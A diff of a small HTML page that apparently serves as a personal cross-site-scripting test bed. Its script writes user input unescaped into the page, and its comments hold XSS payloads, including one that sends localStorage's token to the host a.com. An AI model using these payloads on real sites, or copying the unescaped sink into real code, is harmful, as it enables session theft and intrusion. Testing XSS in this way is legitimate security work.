@@ -5,7 +5,7 @@
 </head>
 <body>
 
-	this is a test page, I am writting  
+	this is a test page, I am writting:
 
 	<div id="rs"></div>
 
@@ -21,26 +21,12 @@
 		function handleInputChange(target){
 			document.getElementById("rs").outerHTML = '<div id="rs">'+target.value+'</div>';
 		}
-
-		function sendToken(){
-			var img=new Image();
-			img.src='http://a.com?token='+ localStorage.getItem("token");
-
-			img.onerror=function(){
-			 alert('error');
-			}
-			
-			img.onload=function(){
-			 alert('success');
-			}
-			
-		}
 	</script>
 
 <!-- 
 		XSS payload for chrome:
 		
-		<img/src=x onerror=sendToken()>
+		<img/src=x onerror="(new Image()).src = 'http://a.com?token='+ localStorage.getItem('token')">
 
 		<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
 
